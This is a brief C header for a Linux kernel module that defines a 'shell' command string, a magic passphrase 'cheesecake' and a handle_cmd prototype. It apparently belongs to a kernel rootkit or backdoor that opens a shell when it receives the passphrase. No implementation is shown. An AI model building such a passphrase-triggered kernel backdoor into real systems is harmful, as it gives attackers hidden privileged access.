#ifndef CMD_H
#define CMD_H
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/module.h>

#define CMD_SHELL "shell"
#define CMD_MAGIC "cheesecake"

int handle_cmd(char *cmd, size_t len);

#endif
